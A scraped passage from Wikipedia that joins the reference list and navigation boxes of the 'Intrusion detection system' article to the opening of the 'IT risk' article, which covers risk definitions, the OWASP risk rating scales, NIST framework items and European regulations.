.




^ 
a
 
b
 
Scarfone, Karen; Mell, Peter (February 2007). 
"Guide to Intrusion Detection and Prevention Systems (IDPS)"
 
(PDF)
. 
Computer Security Resource Center
 (800–94). Archived from 
the original
 
(PDF)
 on 1 June 2010
. Retrieved 
1 January
 2010
.




^ 
a
 
b
 
Scarfone, K. A.; Mell, P. M. (February 2007). 
"NIST – Guide to Intrusion Detection and Prevention Systems (IDPS)"
 
(PDF)
. 
doi
:
10.6028/NIST.SP.800-94
. Retrieved 
27 December
 2023
.




^ 
a
 
b
 
Newman, R.C. (19 February 2009). 
Computer Security: Protecting Digital Resources
. Jones & Bartlett Learning. 
ISBN
 
978-0-7637-5994-0
. Retrieved 
27 December
 2023
.




^ 
a
 
b
 
c
 
Michael E. Whitman; Herbert J. Mattord (2009). 
Principles of Information Security
. Cengage Learning EMEA. 
ISBN
 
978-1-4239-0177-8
. Retrieved 
25 June
 2010
.




^
 
Tim Boyles (2010). 
CCNA Security Study Guide: Exam 640-553
. John Wiley and Sons. p. 249. 
ISBN
 
978-0-470-52767-2
. Retrieved 
29 June
 2010
.




^
 
Harold F. Tipton; Micki Krause (2007). 
Information Security Management Handbook
. CRC Press. p. 1000. 
ISBN
 
978-1-4200-1358-0
. Retrieved 
29 June
 2010
.




^
 
John R. Vacca (2010). 
Managing Information Security
. Syngress. p. 137. 
ISBN
 
978-1-59749-533-2
. Retrieved 
29 June
 2010
.




^
 
Engin Kirda; Somesh Jha; Davide Balzarotti (2009). 
Recent Advances in Intrusion Detection: 12th International Symposium, RAID 2009, Saint-Malo, France, September 23–25, 2009, Proceedings
. Springer. p. 162. 
ISBN
 
978-3-642-04341-3
. Retrieved 
29 June
 2010
.




^
 
Liao, Hung-Jen; Richard Lin, Chun-Hung; Lin, Ying-Chih; Tung, Kuang-Yuan (2013-01-01). 
"Intrusion detection system: A comprehensive review"
. 
Journal of Network and Computer Applications
. 
36
 (1): 16–24. 
doi
:
10.1016/j.jnca.2012.09.004
. 
ISSN
 
1084-8045
.




^ 
a
 
b
 
nitin.; Mattord, verma (2008). 
Principles of Information Security
. Course Technology. pp. 
290–301
. 
ISBN
 
978-1-4239-0177-8
.




^
 
Nti, Isaac Kofi; Nyarko-Boateng, Owusu; Adekoya, Adebayo Felix; Arjun, R (December 2021). "Network Intrusion Detection with StackNet: A phi coefficient Based Weak Learner Selection Approach". 
2021 22nd International Arab Conference on Information Technology (ACIT)
. pp. 1–11. 
doi
:
10.1109/ACIT53391.2021.9677338
. 
ISBN
 
978-1-6654-1995-6
. 
S2CID
 
246039483
.




^
 
Liao, Hung-Jen; Richard Lin, Chun-Hung; Lin, Ying-Chih; Tung, Kuang-Yuan (2013-01-01). 
"Intrusion detection system: A comprehensive review"
. 
Journal of Network and Computer Applications
. 
36
 (1): 16–24. 
doi
:
10.1016/j.jnca.2012.09.004
. 
ISSN
 
1084-8045
.




^
 
"IDS Best Practices"
. 
cybersecurity.att.com
. Retrieved 
2020-06-26
.




^ 
a
 
b
 
c
 
Richardson, Stephen (2020-02-24). 
"IDS Placement - CCIE Security"
. 
Cisco Certified Expert
. Retrieved 
2020-06-26
.




^ 
a
 
b
 
c
 
Anderson, Ross (2001). 
Security Engineering: A Guide to Building Dependable Distributed Systems
. New York: 
John Wiley & Sons
. pp. 
387–388
. 
ISBN
 
978-0-471-38922-4
.




^
 
Schupp, Steve (1 December 2000). 
"Limitations of Network Intrusion Detection"
 
(PDF)
. 
Global Information Assurance Certification
. Retrieved 
17 December
 2023
.




^ 
a
 
b
 
Hawedi, Mohamed; Talhi, Chamseddine; Boucheneb, Hanifa (2018-09-01). 
"Multi-tenant intrusion detection system for public cloud (MTIDS)"
. 
The Journal of Supercomputing
. 
74
 (10): 5199–5230. 
doi
:
10.1007/s11227-018-2572-6
. 
ISSN
 
0920-8542
. 
S2CID
 
52272540
.




^
 
Anderson, James P. (1980-04-15). 
"Computer Security Threat Monitoring and Surveillance"
 
(PDF)
. 
csrc.nist.gov
. Washington, PA, James P. Anderson Co. 
Archived
 
(PDF)
 from the original on 2019-05-14
. Retrieved 
2021-10-12
.




^
 
David M. Chess; Steve R. White (2000). "An Undetectable Computer Virus". 
Proceedings of Virus Bulletin Conference
. 
CiteSeerX
 
10.1.1.25.1508
.




^
 
Denning, Dorothy E., "An Intrusion Detection Model," Proceedings of the Seventh IEEE Symposium on Security and Privacy, May 1986, pages 119–131




^
 
Lunt, Teresa F., "IDES:  An Intelligent System for Detecting Intruders," Proceedings of the Symposium on Computer Security; Threats, and Countermeasures; Rome, Italy, November 22–23, 1990, pages 110–121.




^
 
Lunt, Teresa F., "Detecting Intruders in Computer Systems," 1993 Conference on Auditing and Computer Technology, SRI International




^
 
Sebring, Michael M., and Whitehurst, R. Alan., "Expert Systems in Intrusion Detection:  A Case Study," The 11th National Computer Security Conference, October, 1988




^
 
Smaha, Stephen E., "Haystack:  An Intrusion Detection System," The Fourth Aerospace Computer Security Applications Conference, Orlando, FL, December, 1988




^
 
McGraw, Gary (May 2007). 
"Silver Bullet Talks with Becky Bace"
 
(PDF)
. 
IEEE Security & Privacy Magazine
. 
5
 (3): 6–9. 
doi
:
10.1109/MSP.2007.70
. Archived from 
the original
 
(PDF)
 on 19 April 2017
. Retrieved 
18 April
 2017
.




^
 
Vaccaro, H.S., and Liepins, G.E., "Detection of Anomalous Computer Session Activity," The 1989 IEEE Symposium on Security and Privacy, May, 1989




^
 
Teng, Henry S., Chen, Kaihu, and Lu, Stephen C-Y, "Adaptive Real-time Anomaly Detection Using Inductively Generated Sequential Patterns," 1990 IEEE Symposium on Security and Privacy




^
 
Heberlein, L. Todd, Dias, Gihan V., Levitt, Karl N., Mukherjee, Biswanath, Wood, Jeff, and Wolber, David, "A Network Security Monitor," 1990 Symposium on Research in Security and Privacy, Oakland, CA, pages 296–304




^
 
Winkeler, J.R., "A UNIX Prototype for Intrusion and Anomaly Detection in Secure Networks," The Thirteenth National Computer Security Conference, Washington, DC., pages 115–124, 1990




^
 
Dowell, Cheri, and Ramstedt, Paul, "The ComputerWatch Data Reduction Tool," Proceedings of the 13th National Computer Security Conference, Washington, D.C., 1990




^
 
Snapp, Steven R, Brentano, James, Dias, Gihan V., Goan, Terrance L., Heberlein, L. Todd, Ho, Che-Lin, Levitt, Karl N., Mukherjee, Biswanath, Smaha, Stephen E., Grance, Tim, Teal, Daniel M. and Mansur, Doug, "DIDS (Distributed Intrusion Detection System) -- Motivation, Architecture, and An Early Prototype," The 14th National Computer Security Conference, October, 1991, pages 167–176.




^
 
Jackson, Kathleen, DuBois, David H., and Stallings, Cathy A., "A Phased Approach to Network Intrusion Detection," 14th National Computing Security Conference, 1991




^
 
Paxson, Vern, "Bro:  A System for Detecting Network Intruders in Real-Time," Proceedings of the 7th USENIX Security Symposium, San Antonio, TX, 1998




^
 
Amoroso, Edward, "Intrusion Detection:  An Introduction to Internet Surveillance, Correlation, Trace Back, Traps, and Response," Intrusion.Net Books, Sparta, New Jersey, 1999, 
ISBN
 
0-9666700-7-8




^
 
Kohlenberg, Toby (Ed.), Alder, Raven, Carter, Dr. Everett F. (Skip) Jr., Esler, Joel., Foster, James C., Jonkman Marty, Raffael, and Poor, Mike, "Snort IDS and IPS Toolkit," Syngress, 2007, 
ISBN
 
978-1-59749-099-3




^
 
Barbara, Daniel, Couto, Julia, Jajodia, Sushil, Popyack, Leonard, and Wu, Ningning, "ADAM:  Detecting Intrusions by Data Mining," Proceedings of the IEEE Workshop on Information Assurance and Security, West Point, NY, June 5–6, 2001




^
 
Intrusion Detection Techniques for Mobile Wireless Networks, ACM WINET 2003 <
http://www.cc.gatech.edu/~wenke/papers/winet03.pdf
>




^
 
Viegas, E.; Santin, A. O.; Fran?a, A.; Jasinski, R.; Pedroni, V. A.; Oliveira, L. S. (2017-01-01). "Towards an Energy-Efficient Anomaly-Based Intrusion Detection Engine for Embedded Systems". 
IEEE Transactions on Computers
. 
66
 (1): 163–177. 
doi
:
10.1109/TC.2016.2560839
. 
ISSN
 
0018-9340
. 
S2CID
 
20595406
.




^
 
França, A. L.; Jasinski, R.; Cemin, P.; Pedroni, V. A.; Santin, A. O. (2015-05-01). "The energy cost of network security: A hardware vs. Software comparison". 
2015 IEEE International Symposium on Circuits and Systems (ISCAS)
. pp. 81–84. 
doi
:
10.1109/ISCAS.2015.7168575
. 
ISBN
 
978-1-4799-8391-9
. 
S2CID
 
6590312
.




^
 
França, A. L. P. d; Jasinski, R. P.; Pedroni, V. A.; Santin, A. O. (2014-07-01). "Moving Network Protection from Software to Hardware: An Energy Efficiency Analysis". 
2014 IEEE Computer Society Annual Symposium on VLSI
. pp. 456–461. 
doi
:
10.1109/ISVLSI.2014.89
. 
ISBN
 
978-1-4799-3765-3
. 
S2CID
 
12284444
.




^
 
"Towards an Energy-Efficient Anomaly-Based Intrusion Detection Engine for Embedded Systems"
 
(PDF)
. 
SecPLab
.






 This article incorporates 
public domain material
 from 
Karen Scarfone, Peter Mell. 
Guide to Intrusion Detection and Prevention Systems, SP800-94
 
(PDF)
. 
National Institute of Standards and Technology
. Retrieved 
1 January
 2010
.




Further reading
[
edit
]


Bace, Rebecca Gurley (2000). 
Intrusion Detection
. Indianapolis, IN: Macmillan Technical. 
ISBN
 
978-1578701858
.


Bezroukov, Nikolai (11 December 2008). 
"Architectural Issues of Intrusion Detection Infrastructure in Large Enterprises (Revision 0.82)"
. Softpanorama
. Retrieved 
30 July
 2010
.


P.M. Mafra and J.S. Fraga and A.O. Santin (2014). 
"Algorithms for a distributed IDS in MANETs"
. 
Journal of Computer and System Sciences
. 
80
 (3): 554–570. 
doi
:
10.1016/j.jcss.2013.06.011
.


Hansen, James V.; Benjamin Lowry, Paul; Meservy, Rayman; McDonald, Dan (2007). "Genetic programming for prevention of cyberterrorism through dynamic and evolving intrusion detection". 
Decision Support Systems (DSS)
. 
43
 (4): 1362–1374. 
doi
:
10.1016/j.dss.2006.04.004
. 
SSRN
 
877981
.


Scarfone, Karen; Mell, Peter (February 2007). 
"Guide to Intrusion Detection and Prevention Systems (IDPS)"
 
(PDF)
. 
Computer Security Resource Center
 (800–94). Archived from 
the original
 
(PDF)
 on 1 June 2010
. Retrieved 
1 January
 2010
.


Singh, Abhishek. 
"Evasions In Intrusion Prevention Detection Systems"
. Virus Bulletin
. Retrieved 
1 April
 2010
.


Dubey, Abhinav. 
"Implementation of Network Intrusion Detection System using Deep Learning"
. Medium
. Retrieved 
17 April
 2021
.


Al_Ibaisi, T., Abu-Dalhoum, A. E.-L., Al-Rawi, M., Alfonseca, M., & Ortega, A. (n.d.). Network Intrusion Detection Using Genetic Algorithm to find Best DNA Signature. 
http://www.wseas.us/e-library/transactions/systems/2008/27-535.pdf


Ibaisi, T. A., Kuhn, S., Kaiiali, M., & Kazim, M. (2023). Network Intrusion Detection Based on Amino Acid Sequence Structure Using Machine Learning. Electronics, 12(20), 4294. 
https://doi.org/10.3390/electronics12204294


External links
[
edit
]


‹ The 
template
 below (
Curlie
) is being considered for deletion. See 
templates for discussion
 to help reach a consensus. ›
Intrusion Detection Systems
 at 
Curlie


Common vulnerabilities and exposures (CVE) by product


NIST SP 800-83, Guide to Malware Incident Prevention and Handling


NIST SP 800-94, Guide to Intrusion Detection and Prevention Systems (IDPS)


Study by Gartner "Magic Quadrant for Network Intrusion Prevention System Appliances"






v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation




v
t
e
Malware
 topics
Infectious malware


Comparison of computer viruses


Computer virus


Computer worm


List of computer worms


Timeline of computer viruses and worms


Concealment


Backdoor


Clickjacking


Man-in-the-browser


Man-in-the-middle


Rootkit


Trojan horse


Zombie computer


Malware for profit


Adware


Botnet


Crimeware


Fleeceware


Form grabbing


Fraudulent dialer


Infostealer


Keystroke logging


Malbot


Privacy-invasive software


Ransomware


Rogue security software


Scareware


Spyware


Web threats


By operating system


Android malware


Classic Mac OS viruses


iOS malware


Linux malware


MacOS malware


Macro virus


Mobile malware


Palm OS viruses


HyperCard viruses


Protection


Anti-keylogger


Antivirus software


Browser security


Data loss prevention software


Defensive computing


Firewall


Internet security


Intrusion detection system


Mobile security


Network security


Countermeasures


Computer and network surveillance


Honeypot


Operation: Bot Roast




Authority control databases
: National 
United States
France
BnF data
Israel










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Intrusion_detection_system&oldid=1238061072
"


Categories
: 
Intrusion detection systems
Computer network security
System administration
Hidden categories: 
CS1 maint: multiple names: authors list
Articles with short description
Short description is different from Wikidata
Articles needing additional references from September 2018
All articles needing additional references
Articles to be expanded from March 2019
All articles to be expanded
Articles to be expanded from July 2016
Wikipedia articles in need of updating from August 2017
All Wikipedia articles in need of updating
Wikipedia articles incorporating text from the National Institute of Standards and Technology
Articles with Curlie links











From Wikipedia, the free encyclopedia






Any risk related to information technology


Information technology risk
, 
IT risk
, 
IT-related risk
, or 
cyber risk
 is any 
risk
 relating to 
information technology
.
[
1
]
 While information has long been appreciated as a valuable and important asset, the rise of the 
knowledge economy
 and the 
Digital Revolution
 has led to organizations becoming increasingly dependent on information, 
information processing
 and especially IT.  Various events or incidents that compromise IT in some way can therefore cause adverse impacts on the organization's business processes or mission, ranging from inconsequential to catastrophic in scale.

Assessing the probability or likelihood of various types of event/incident with their predicted impacts or consequences, should they occur, is a common way to assess and measure IT risks.
[
2
]
  Alternative methods of measuring IT risk typically involve assessing other contributory factors such as the 
threats
, vulnerabilities, exposures, and asset values.
[
3
]
[
4
]






Definitions
[
edit
]


ISO
[
edit
]


IT risk
: 
the potential that a given 
threat
 will exploit 
vulnerabilities
 of an 
asset
 or group of assets and thereby cause harm to the organization. It is measured in terms of a combination of the probability of occurrence of an event and its consequence.
[
5
]




Committee on National Security Systems
[
edit
]


The 
Committee on National Security Systems
 of 
United States of America
 defined 
risk
 in different documents:



From CNSS Instruction No. 4009 dated 26 April 2010
[
6
]
 the basic and more technical focused definition:

Risk – Possibility that a particular threat will adversely impact an IS by exploiting a particular vulnerability.


National Security Telecommunications and Information Systems Security Instruction (NSTISSI) No. 1000,
[
7
]
 introduces a probability aspect, quite similar to NIST SP 800-30 one:

Risk – A combination of the likelihood that a threat will occur, the likelihood that a threat occurrence will result in an adverse impact, and the severity of the resulting impact


National Information Assurance Training and Education Center
 defines risk in the IT field as:
[
8
]




The loss potential that exists as the result of threat-vulnerability pairs. Reducing either the threat or the vulnerability reduces the risk.


The uncertainty of loss expressed in terms of probability of such loss.


The probability that a hostile entity will successfully exploit a particular telecommunications or COMSEC system for intelligence purposes; its factors are threat and vulnerability.


A combination of the likelihood that a threat shall occur, the likelihood that a threat occurrence shall result in an adverse impact, and the severity of the resulting adverse impact.


the probability that a particular threat will exploit a particular vulnerability of the system.


NIST
[
edit
]


Many 
NIST
 publications define 
risk
 in IT context in different publications: FISMApedia
[
9
]
 term
[
10
]
 provide a list. Between them:



According to 
NIST
 SP 800-30:
[
11
]


Risk is a function of the likelihood of a given threat-source’s exercising a particular potential vulnerability, and the resulting impact of that adverse event on the organization.


From NIST FIPS 200
[
12
]


Risk – The level of impact on organizational operations (including mission, functions, image, or reputation), organizational assets, or individuals resulting from the operation of an information system given the potential impact of a threat and the likelihood of that threat occurring.


NIST
 SP 800-30
[
11
]
 defines:



IT-related risk




The net mission impact considering:


the probability that a particular threat-source will exercise (accidentally trigger or intentionally exploit) a particular information system vulnerability and


the resulting impact if this should occur. IT-related risks arise from legal liability or mission loss due to:


Unauthorized (malicious or accidental) disclosure, modification, or destruction of information


Unintentional errors and omissions


IT disruptions due to natural or man-made disasters


Failure to exercise due care and diligence in the implementation and operation of the IT system.


Risk management insight
[
edit
]


IT risk is the probable frequency and probable magnitude of future loss.
[
13
]




ISACA
[
edit
]


ISACA
 published the 
Risk IT
 Framework in order to provide an end-to-end, comprehensive view of all risks related to the use of IT. There,
[
14
]
 IT risk is defined as:



The business risk associated with the use, ownership, operation, involvement, influence and adoption of IT within an enterprise


According to 
Risk IT
,
[
14
]
 IT risk has a broader meaning: it encompasses not just only the negative 
impact
 of operations and service delivery which can bring destruction or reduction of the value of the organization, but also the benefit\value enabling risk associated to missing opportunities to use technology to enable or enhance business or the IT project management for aspects like overspending or late delivery with adverse business impact



Measuring IT risk
[
edit
]


You can't effectively and consistently manage what you can't measure, and you can't measure what you haven't defined.
[
13
]
[
15
]


Measuring IT risk (or cyber risk) can occur at many levels. At a business level, the risks are managed categorically. Front line IT departments and 
NOC
's tend to measure more discrete, individual risks. Managing the nexus between them is a key role for modern 
CISO
's.


When measuring risk of any kind, selecting the correct equation for a given threat, asset, and available data is an important step. Doing so is subject unto itself, but there are common components of risk equations that are helpful to understand. 
There are four fundamental forces involved in risk management, which also apply to cybersecurity. They are assets, impact, threats, and likelihood. You have internal knowledge of and a fair amount of control over 
assets
, which are tangible and intangible things that have value. You also have some control over 
impact
, which refers to loss of, or damage to, an asset. However, 
threats
 that represent adversaries and their methods of attack are external to your control. 
Likelihood
 is the wild card in the bunch. Likelihoods determine if and when a threat will materialize, succeed, and do damage. While never fully under your control, likelihoods can be shaped and influenced to manage the risk.

[
16
]
Mathematically, the forces can be represented in a formula such as: 








R


i


s


k


=


p


(


A


s


s


e


t


,


T


h


r


e


a


t


)


×


d


(


A


s


s


e


t


,


T


h


r


e


a


t


)






{\textstyle Risk=p(Asset,Threat)\times d(Asset,Threat)}




 where p() is the likelihood that a Threat will materialize/succeed against an Asset, and d() is the likelihood of various levels of damage that may occur.
[
17
]
 
The field of IT risk management has spawned a number of terms and techniques which are unique to the industry. Some industry terms have yet to be reconciled. For example, the term 
vulnerability
 is often used interchangeably with likelihood of occurrence, which can be problematic.  Often encountered IT risk management terms and techniques include:

Information security event


An identified occurrence of a system, service or network state indicating a possible breach of information security policy or failure of safeguards, or a previously unknown situation that may be security relevant.
[
5
]


Occurrence of a particular set of circumstances
[
18
]


The event can be certain or uncertain.


The event can be a single occurrence or a series of occurrences. :(ISO/IEC Guide 73)


Information security incident




is indicated by a single or a series of unwanted information security events that have a significant probability of compromising business operations and threatening information security
[
5
]


An event [G.11] that has been assessed as having an actual or potentially adverse effect on the security or performance of a system.
[
19
]


Impact
[
20
]


The result of an unwanted incident [G.17].(ISO/IEC PDTR 13335-1)


Consequence
[
21
]


Outcome of an event [G.11]


There can be more than one consequence from one event.


Consequences can range from positive to negative.


Consequences can be expressed qualitatively or quantitatively (ISO/IEC Guide 73)


The risk 
R
 is the product of the likelihood 
L
 of a security incident occurring times the 
impact
 
I
 that will be incurred to the organization due to the incident, that is:
[
22
]




R
 = 
L
 × 
I


The likelihood of a security incident occurrence is a function of the likelihood that a threat appears and the likelihood that the threat can successfully exploit the relevant system vulnerabilities.

The consequence of the occurrence of a security incident are a function of likely impact that the incident will have on the organization as a result of the harm the organization assets will sustain. Harm is related to the value of the assets to the organization; the same asset can have different values to different organizations.

So R can be function of four 
factors
:



A = Value of the 
assets


T = the likelihood of the 
threat


V = the nature of 
vulnerability
 i.e. the likelihood that can be exploited (proportional to the potential benefit for the attacker and inversely proportional to the cost of exploitation)


I = the likely 
impact
, the extent of the harm


If numerical values (money for impact and probabilities for the other factors), the risk can be expressed in monetary terms and compared to the cost of countermeasures and the residual risk after applying the security control. It is not always practical to express this values, so in the first step of risk evaluation, risk are graded dimensionless in three or five steps scales.

OWASP
 proposes a practical risk measurement guideline
[
22
]
 based on:



Estimation of Likelihood as a mean between different factors in a 0 to 9 scale:

Threat agent
 factors

Skill level: How technically skilled is this group of threat agents? No technical skills (1), some technical skills (3), advanced computer user (4), network and programming skills (6), security penetration skills (9)


Motive: How motivated is this group of threat agents to find and exploit this vulnerability? Low or no reward (1), possible reward (4), high reward (9)


Opportunity: What resources and opportunity are required for this group of threat agents to find and exploit this vulnerability? full access or expensive resources required (0), special access or resources required (4), some access or resources required (7), no access or resources required (9)


Size: How large is this group of threat agents? Developers (2), system administrators (2), intranet users (4), partners (5), authenticated users (6), anonymous Internet users (9)


Vulnerability
 Factors: the next set of factors are related to the vulnerability involved. The goal here is to estimate the likelihood of the particular vulnerability involved being discovered and exploited. Assume the threat agent selected above.

Ease of discovery: How easy is it for this group of threat agents to discover this vulnerability? Practically impossible (1), difficult (3), easy (7), automated tools available (9)


Ease of 
exploit
: How easy is it for this group of threat agents to actually exploit this vulnerability? Theoretical (1), difficult (3), easy (5), automated tools available (9)


Awareness: How well known is this vulnerability to this group of threat agents? Unknown (1), hidden (4), obvious (6), public knowledge (9)


Intrusion detection: How likely is an exploit to be detected? Active detection in application (1), logged and reviewed (3), logged without review (8), not logged (9)


Estimation of Impact as a mean between different factors in a 0 to 9 scale

Technical Impact Factors; technical impact can be broken down into factors aligned with the traditional security areas of concern: confidentiality, integrity, availability, and accountability. The goal is to estimate the magnitude of the impact on the system if the vulnerability were to be exploited.

Loss of 
confidentiality
: How much data could be disclosed and how sensitive is it? Minimal non-sensitive data disclosed (2), minimal critical data disclosed (6), extensive non-sensitive data disclosed (6), extensive critical data disclosed (7), all data disclosed (9)


Loss of 
integrity
: How much data could be corrupted and how damaged is it? Minimal slightly corrupt data (1), minimal seriously corrupt data (3), extensive slightly corrupt data (5), extensive seriously corrupt data (7), all data totally corrupt (9)


Loss of 
availability
 How much service could be lost and how vital is it? Minimal secondary services interrupted (1), minimal primary services interrupted (5), extensive secondary services interrupted (5), extensive primary services interrupted (7), all services completely lost (9)


Loss of accountability: Are the threat agents' actions traceable to an individual? Fully traceable (1), possibly traceable (7), completely anonymous (9)


Business Impact Factors: The business impact stems from the technical impact, but requires a deep understanding of what is important to the company running the application. In general, you should be aiming to support your risks with business impact, particularly if your audience is executive level. The business risk is what justifies investment in fixing security problems.

Financial damage: How much financial damage will result from an exploit? Less than the cost to fix the vulnerability (1), minor effect on annual profit (3), significant effect on annual profit (7), bankruptcy (9)


Reputation damage: Would an exploit result in reputation damage that would harm the business? Minimal damage (1), Loss of major accounts (4), loss of goodwill (5), brand damage (9)


Non-compliance: How much exposure does non-compliance introduce? Minor violation (2), clear violation (5), high-profile violation (7)


Privacy
 violation: How much personally identifiable information could be disclosed? One individual (3), hundreds of people (5), thousands of people (7), millions of people (9)


If the business impact is calculated accurately use it in the following otherwise use the Technical impact


Rate likelihood and impact in a LOW, MEDIUM, HIGH scale assuming that less than 3 is LOW, 3 to less than 6 is MEDIUM, and 6 to 9 is HIGH.


Calculate the risk using the following table






Overall Risk Severity





Impact



HIGH



Medium



High



Critical





MEDIUM



Low



Medium



High





LOW



None



Low



Medium





 



LOW



MEDIUM



HIGH





 



Likelihood



IT risk management
[
edit
]


Risk Management Elements


Main article: 
IT risk management


An IT risk management system (ITRMS) is a component of a broader 
enterprise risk management
 (ERM) system.
[
23
]
 ITRMS are also integrated into broader 
information security management systems
 (ISMS). The continuous update and maintenance of an ISMS is in turn part of an organisation's systematic approach for identifying, assessing, and managing information security risks.
[
24
]
The 
Certified Information Systems Auditor
 Review Manual 2006 by ISACA provides this definition of risk management: "
Risk management is the process of identifying 
vulnerabilities
 and 
threats
 to the information resources used by an organization in achieving business objectives, and deciding what 
countermeasures
, if any, to take in reducing risk to an acceptable level, based on the value of the information resource to the organization.
"
[
25
]

The 
NIST Cybersecurity Framework
 encourages organizations to manage IT risk as part the 
Identify
 (ID) function:
[
26
]
[
27
]


Risk Assessment (ID.RA)
: The organization understands the cybersecurity risk to organizational operations (including mission, functions, image, or reputation), organizational assets, and individuals.



ID.RA-1: Asset vulnerabilities are identified and documented


ID.RA-2: Cyber threat intelligence and vulnerability information is received from information sharing forums and source


ID.RA-3: Threats, both internal and external, are identified and documented


ID.RA-4: Potential business impacts and likelihoods are identified


ID.RA-5: Threats, vulnerabilities, likelihoods, and impacts are used to determine risk


ID.RA-6: Risk responses are identified and prioritized


Risk Management Strategy (ID.RM)
: The organization’s priorities, constraints, risk tolerances, and assumptions are established and used to support operational risk decisions. 



ID.RM-1: Risk management processes are established, managed, and agreed to by organizational stakeholders


ID.RM-2: Organizational risk tolerance is determined and clearly expressed


ID.RM-3: The organization’s determination of risk tolerance is informed by its role in critical infrastructure and sector specific risk analysis


IT risk laws and regulations
[
edit
]


In the following a brief description of applicable rules organized by source.
[
28
]




OECD
[
edit
]


OECD
 issued the following:



Organisation for Economic Co-operation and Development (OECD) Recommendation of the Council concerning guidelines governing the protection of privacy and trans-border flows of personal data
 (23 September 1980)


OECD Guidelines for the Security of Information Systems and Networks: Towards a Culture of Security
 (25 July 2002). Topic: General information security. Scope: Non binding guidelines to any OECD entities (governments, businesses, other organisations and individual users who develop, own, provide, manage, service, and use information systems and networks). The OECD Guidelines state the basic principles underpinning risk management and information security practices. While no part of the text is binding as such, non-compliance with any of the principles is indicative of a serious breach of RM/RA good practices that can potentially incur liability.


European Union
[
edit
]


The 
European Union
 issued the following, divided by topic:



Privacy


Regulation (EC) No 45/2001
 on the protection of individuals with regard to the processing of personal data by the Community institutions and bodies and on the free movement of such data provide an internal regulation, which is a practical application of the principles of the Privacy Directive described below. Furthermore, article 35 of the Regulation requires the Community institutions and bodies to take similar precautions with regard to their telecommunications infrastructure, and to properly inform the users of any specific risks of security breaches.


Directive 95/46/EC
 on the protection of individuals with regard to the 
processing of personal data
 and on the free movement of such data require that any personal data processing activity undergoes a prior risk analysis in order to determine the privacy implications of the activity, and to determine the appropriate legal, technical and organisation measures to protect such activities;is effectively protected by such measures, which must be state of the art keeping into account the sensitivity and privacy implications of the activity (including when a third party is charged with the processing task) is notified to a national data protection authority, including the measures taken to ensure the security of the activity. Furthermore, article 25 and following of the Directive requires Member States to ban the transfer of personal data to non-Member States, unless such countries have provided adequate legal protection for such personal data, or barring certain other exceptions.


Commission Decision 2001/497/EC of 15 June 2001
 on standard contractual clauses for the transfer of personal data to third countries, under Directive 95/46/EC; and 
Commission Decision 2004/915/EC
 of 27 December 2004 amending Decision 2001/497/EC as regards the introduction of an alternative set of standard contractual clauses for the transfer of personal data to third countries. Topic: Export of personal data to third countries, specifically non-E.U. countries which have not been recognised as having a data protection level that is adequate (i.e. equivalent to that of the E.U.). Both Commission Decisions provide a set of voluntary model clauses which can be used to export personal data from a data controller (who is subject to E.U. data protection rules) to a data processor outside the E.U. who is not subject to these rules or to a similar set of adequate rules.


International Safe Harbor Privacy Principles
 (see below 
USA
 and 
International Safe Harbor Privacy Principles
 )


Directive 2002/58/EC
 of 12 July 2002 concerning the processing of personal data and the protection of privacy in the electronic communications sector


National Security


Directive 2006/24/EC
 of 15 March 2006 on the retention of data generated or processed in connection with the provision of publicly available electronic communications services or of public communications networks and amending Directive 2002/58/EC (‘
Data Retention Directive
’). Topic: Requirement for the providers of public electronic telecommunications service providers to retain certain information for the purposes of the investigation, detection and prosecution of serious crime


Council Directive 2008/114/EC
 of 8 December 2008 on the identification and designation of European critical infrastructures and the assessment of the need to improve their protection. Topic: Identification and protection of European Critical Infrastructures. Scope: Applicable to Member States and to the operators of European Critical Infrastructure (defined by the draft directive as ‘critical infrastructures the disruption or destruction of which would significantly affect two or more Member States, or a single Member State if the critical infrastructure is located in another Member State. This includes effects resulting from cross-sector dependencies on other types of infrastructure’). Requires Member States to identify critical infrastructures on their territories, and to designate them as ECIs. Following this designation, the owners/operators of ECIs are required to create Operator Security Plans (OSPs), which should establish relevant security solutions for their protection


Civil and Penal law

Council Framework Decision 2005/222/JHA
 of 24 February 2005 on attacks against information systems. Topic: General decision aiming to harmonise national provisions in the field of cyber crime, encompassing material criminal law (i.e. definitions of specific crimes), procedural criminal law (including investigative measures and international cooperation) and liability issues. Scope: Requires Member States to implement the provisions of the Framework Decision in their national legal frameworks. Framework decision is relevant to RM/RA because it contains the conditions under which legal liability can be imposed on legal entities for conduct of certain natural persons of authority within the legal entity. Thus, the Framework decision requires that the conduct of such figures within an organisation is adequately monitored, also because the Decision states that a legal entity can be held liable for acts of omission in this regard.


Council of Europe
[
edit
]


Council of Europe Convention on Cybercrime, Budapest, 23.XI.2001
, European Treaty Series-No. 185. Topic: General treaty aiming to harmonise national provisions in the field of cyber crime, encompassing material criminal law (i.e. definitions of specific crimes), procedural criminal law (including investigative measures and international cooperation), liability issues and data retention. Apart from the definitions of a series of criminal offences in articles 2 to 10, the Convention is relevant to RM/RA because it states the conditions under which legal liability can be imposed on legal entities for conduct of certain natural persons of authority within the legal entity. Thus, the Convention requires that the conduct of such figures within an organisation is adequately monitored, also because the Convention states that a legal entity can be held liable for acts of omission in this regard.


United States
[
edit
]


United States issued the following, divided by topic:



Civil and Penal law

